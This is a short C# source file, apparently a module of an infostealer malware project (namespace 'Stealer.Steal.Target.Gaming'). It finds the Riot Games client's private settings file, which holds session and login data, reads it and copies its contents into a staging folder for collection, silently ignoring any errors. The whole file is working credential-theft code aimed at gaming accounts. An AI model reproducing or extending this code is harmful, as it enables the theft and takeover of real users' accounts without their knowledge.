using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Gaming;

internal class Riot
{
	public static void Start()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data", "RiotGamesPrivateSettings.yaml");
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			DynamicFiles.CopyDirectory(Path.Combine("Gaming", "Riot"), File.ReadAllText(path));
		}
		catch
		{
		}
	}
}
